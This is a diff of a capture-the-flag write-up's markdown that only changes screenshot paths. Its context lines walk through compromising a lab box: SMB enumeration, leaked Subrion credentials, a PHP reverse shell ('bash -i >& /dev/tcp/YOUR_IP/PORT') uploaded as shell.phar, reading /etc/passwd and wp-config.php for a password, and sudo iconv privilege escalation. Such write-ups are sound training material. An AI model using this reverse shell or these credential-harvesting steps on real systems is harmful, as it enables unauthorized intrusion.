@@ -14,7 +14,7 @@ For enumeration I used a simple nmap scan with the key -A (which includes -sC - 
 nmap -A 10.201.31.100
 ```
 
-![Nmap Scan](assets/nmap-scan.png)
+![Nmap Scan](assets/images/nmap-scan.png)
 
 The scan has identified 4 open ports:
 - 22: SSH
@@ -31,7 +31,7 @@ smbclient -L //10.201.31.100/ -N
 This command lists all the available shares (-L) on the target as well as supresses the password prompt, since we already know that a connection can be established with a guest account:
 
 
-![Samba Scan](assets/smb-scan.png)
+![Samba Scan](assets/images/smb-scan.png)
 
 The websrv share is exactly what we are looking for here. Lets connect to the share and inspect what it contains. For this purpose I used the same command, but removed the -L key to simply connect to the share instead of listing:
 
@@ -39,14 +39,14 @@ The websrv share is exactly what we are looking for here. Lets connect to the sh
 smbclient //10.201.31.100/websvr -N
 ```
 
-![Samba Share](assets/smb-share.png)
+![Samba Share](assets/images/smb-share.png)
 
 
 And there it is! Using simple commands - ls and get, we have spotted the file enter.txt and downloaded it for later inspection.
 
 Let us take a look at what is inside the file we have just downloaded.
 
-![Enter.txt File](assets/enter.txt.png)
+![Enter.txt File](assets/images/enter.txt.png)
 
 The samba share is cleared now. Now we will see what we have on the HTTP front, but first lets assess the txt file. The file describes 'goals' for the admin, they include:
 - Setting up a fake popup website
@@ -65,7 +65,7 @@ This tool can be used to encode/decode various inputs such as base64, base32, he
 
 Using that tool on the key we found, gives us the following result:
 
-![CyberChef](assets/CyberChef.png)
+![CyberChef](assets/images/CyberChef.png)
 
 
 So here are the credentials for the Subrion panel:
@@ -80,24 +80,24 @@ Now, that we have the credentials for the Subrion panel, let us go and see the w
 
 We are greeted with the defualt apache index.html page:
 
-![Apache Page](assets/apache-page.png)
+![Apache Page](assets/images/apache-page.png)
 
 Now lets try and view the subrion using /subrion:
 
-![Subrion Issue](assets/subrion-issue.png)
+![Subrion Issue](assets/images/subrion-issue.png)
 
 I assume this is the issue the admin was talking about. The CMS is misconfigured which leads to a redirection of the home page.
 
 Since we already know that a subrion panel exists and that it should not have the smae issue, lets visit that page and use the credentials we have already acquired:
 
-![Subrion Logoin](assets/subrion-login.png)
+![Subrion Logoin](assets/images/subrion-login.png)
 
 
-![Subrion Panel](assets/subrion-panel.png)
+![Subrion Panel](assets/images/subrion-panel.png)
 
 Now, if we go onto the System ---> System on the left dock we can see that the site url is misconfigured:
 
-![Subrion Panel](assets/subrion-misconfig.png)
+![Subrion Panel](assets/images/subrion-misconfig.png)
 
 Fix the issue by inserting the correct IP address instead of the faulty one. This will be crucial for latter steps.
 
@@ -131,15 +131,15 @@ system("bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'");
 I am going to use my ip plus port 7777 since it is very rarely occupied.
 Name your file something like shell.phar or shell.pht (.phar worked perfectly for me).
 
-![shell.phar file](assets/shell-file.jpg)
+![shell.phar file](assets/images/shell-file.jpg)
 
 After creating the file, go to Content ---> Uploads in Subrion Panel. You should get a page which looks like this:
 
-![Subrion Uploads](assets/subrion-uploads.png)
+![Subrion Uploads](assets/images/subrion-uploads.png)
 
 On the top panel, there is a button 'Upload files' or just drag-and-drop the reverse shell you have just created:
 
-![Shell Uploaded](assets/shell-uploaded.png)
+![Shell Uploaded](assets/images/shell-uploaded.png)
 
 Nice! Now, before launching the shell, lets create a session on our end that awaits incoming connections. We can accomplish that with the following netcat command:
 
@@ -149,7 +149,7 @@ nc -nlvp 7777
 
 The last parameter is the port number that you have used when creating the reverse shell, as I have previously stated, I chose 7777.
 
-![NetCat Listen](assets/netcat-listen.png)
+![NetCat Listen](assets/images/netcat-listen.png)
 
 Now that our devices is awaiting a connection attempt, lets launch the reverse shell we have planted:
 
@@ -159,17 +159,17 @@ Go to the directory /subrion/uploads/NAME_OF_THE_SHELL in the browser. For examp
 http://10.201.31.100/subrion/uploads/shell.phar
 ```
 
-![Shell URL](assets/shell-url.png)
+![Shell URL](assets/images/shell-url.png)
 
 And this is the result we get on our device:
 
-![Connection Established](assets/nc-connection.png)
+![Connection Established](assets/images/nc-connection.png)
 
 We have successfully deployed a reverse shell. Now we need to perform a Local Privilege Escalation (LPE) to gain access to root.txt.
 
 Let's look at what we have on the server:
 
-![Listing Server](assets/listing-server.png)
+![Listing Server](assets/images/listing-server.png)
 
 The Subrion directory is now useless; it has served its purpose. The test directory is not something we are going to be looking at, it is useless as well. 
 
@@ -177,36 +177,36 @@ While running a few scans, such as capabilities (```getcap -r / 2>/dev/null```) 
 
 A new user has to be found; let's look at /etc/passwd:
 
-![/etc/passwd File](assets/passwd-file.png)
+![/etc/passwd File](assets/images/passwd-file.png)
 
 There! We have a new user who is eligble for login - **scamsite**. The only way we can access this user is to pick one of the passwords already available to us.
 
 I have tried using Scam2021, but to no avail. The only other directory we can find credentials at - is wordpress. Lets go back to that directory and find the credentials.
 
-![Listing WordPress](assets/wp-ls.png)
+![Listing WordPress](assets/images/wp-ls.png)
 
 The file wp-config.php usually contains credentials for the admin account. Let's inspect it:
 
-![WordPress Config](assets/wp-config.png)
+![WordPress Config](assets/images/wp-config.png)
 
 And there it is, we can see that the password for user support in the SQL database is **ImAScammerLOL!123!**.
 
 Since the reverse shell I spawned is not interactive, I will use SSH to connect to that user.
 
-![SSH Connection](assets/ssh-connection.png)
+![SSH Connection](assets/images/ssh-connection.png)
 
 Nice, it worked. Now, let's take a look at `sudo -l` since we know the password for this user.
 
-![SUDO -l](assets/sudo-l.png)
+![SUDO -l](assets/images/sudo-l.png)
 
 Interesting, we are allowed to use iconv with root privileges. Let's see if we can use that for LPE via https://gtfobins.github.io:
 
-![GTFOBINS](assets/gtfobins.png)
+![GTFOBINS](assets/images/gtfobins.png)
 
 Perfect! This shows that we can use **iconv** to read files that require elevated privileges (for example, our file root.txt). Let's use the exploit shown on GTFOBins to read the file /root/root.txt.
 
 Do not forget to use sudo!
 
-![LPE](assets/LPE.jpg)
+![LPE](assets/images/LPE.jpg)
 
 Thank you for visiting!)
